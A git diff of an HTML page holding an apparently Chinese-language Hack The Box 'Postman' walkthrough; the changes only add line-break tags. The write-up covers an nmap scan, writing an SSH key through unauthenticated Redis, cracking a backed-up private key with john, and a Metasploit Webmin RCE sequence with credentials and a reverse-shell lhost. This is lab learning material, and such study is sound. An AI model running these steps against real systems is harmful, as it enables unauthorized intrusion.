@@ -7544,10 +7544,10 @@
 
 <h2 id="postman">Postman</h2>
 <p><img alt="image.png" src="../img/551828_rze0obvvgrz8pt23/1582795803744-b10ecc9d-c7d6-4589-95a2-d0d6a7395f8e-087730.png" /></p>
-<p>nmap 扫描一波端口：
- <code>nmap -A -Pn -T4 10.10.10.160</code>
--Pn    将所有主机视作开启，跳过主机发现的过程     
--A     OS识别,版本探测，脚本扫描和traceroute
+<p>nmap 扫描一波端口：<br />
+<code>nmap -A -Pn -T4 10.10.10.160</code><br />
+-Pn    将所有主机视作开启，跳过主机发现的过程     <br />
+-A     OS识别,版本探测，脚本扫描和traceroute<br />
 -T  （0-5）时间优化</p>
 <p><img alt="image.png" src="../img/551828_rze0obvvgrz8pt23/1582802742965-ab22a6a1-3d86-430f-97ba-3da9b048aea8-598256.png" /></p>
 <p>去看一下，80 端口没什么东西， 10000，用 https 访问，有个登录界面，弱口令没得</p>
@@ -7610,25 +7610,25 @@ else:
 <p>关于 redis 核心利用点是，<strong>通过没有身份校验的 redis 服务进行登陆</strong>，同时<strong>指定 config dir 和 config dbfilename 的路径与名称</strong>，达到<strong>把本地公钥存储到远程服务器</strong>上，这时候在通过 ssh 进行远程登陆。可以<strong>获得名为 redis 的 shell</strong></p>
 <p><code>python redis.py 10.10.10.160 redis</code></p>
 <p><img alt="image.png" src="../img/551828_rze0obvvgrz8pt23/1582808571536-7594ad74-d490-43fd-9285-a02c952b5b0d-582049.png" /></p>
-<p><img alt="image.png" src="../img/551828_rze0obvvgrz8pt23/1582808590618-4b9b5faa-6162-4778-86c5-9ff9f3f91128-364569.png" />
- 
+<p><img alt="image.png" src="../img/551828_rze0obvvgrz8pt23/1582808590618-4b9b5faa-6162-4778-86c5-9ff9f3f91128-364569.png" /><br />
+<br />
 再 opt 目录下找到 id_rsa.bak </p>
 <p><img alt="image.png" src="../img/551828_rze0obvvgrz8pt23/1582860440319-87010c5c-1190-49a1-8533-4372be591ac9-711963.png" /></p>
 <p>保存出来，用 john 破解一下</p>
 <p><img alt="image.png" src="../img/551828_rze0obvvgrz8pt23/1582860526552-c0181956-da49-435f-9552-6f529d08ff9b-011934.png" /></p>
 <p>su Matt 切换一下账户，用破解出来得密码来登录，再 Matt 家目录下有 user.txt</p>
 <p><img alt="image.png" src="../img/551828_rze0obvvgrz8pt23/1582860892717-272efab3-aa9e-4dd4-9cc4-54d2b7c4ed08-337724.png" /></p>
-<p>同时，这个用户名和密码可以登录之前那个 10000 端口的 webmin 可以登录成功
-可以用 msf 来攻击
+<p>同时，这个用户名和密码可以登录之前那个 10000 端口的 webmin 可以登录成功<br />
+可以用 msf 来攻击<br />
 msfconsole，打开 msf</p>
 <p><img alt="image.png" src="../img/551828_rze0obvvgrz8pt23/1582861564220-13f901c6-27b1-4c57-a29c-4fdd747cf668-605826.png" /></p>
-<p>使用：
-use exploit/linux/http/webmin_packageup_rce   //选择 payload
-set rhosts 10.10.10.160     //设置攻击目标
-set ssl true     //使用 https 
-set username Matt    // 设置 username
-set password computer2008     //设置 password
-set lhost 10.10.14.18     //设置反弹 shell 的地址（本机 IP）
+<p>使用：<br />
+use exploit/linux/http/webmin_packageup_rce   //选择 payload<br />
+set rhosts 10.10.10.160     //设置攻击目标<br />
+set ssl true     //使用 https <br />
+set username Matt    // 设置 username<br />
+set password computer2008     //设置 password<br />
+set lhost 10.10.14.18     //设置反弹 shell 的地址（本机 IP）<br />
 exploit    //执行攻击</p>
 <p><img alt="image.png" src="../img/551828_rze0obvvgrz8pt23/1582862011791-f2e3dd50-894c-4b2e-aaaa-c90b5aab7ea8-665503.png" /></p>
 <p>在 /root/root.txt 中存在 root 级别的 flag</p>
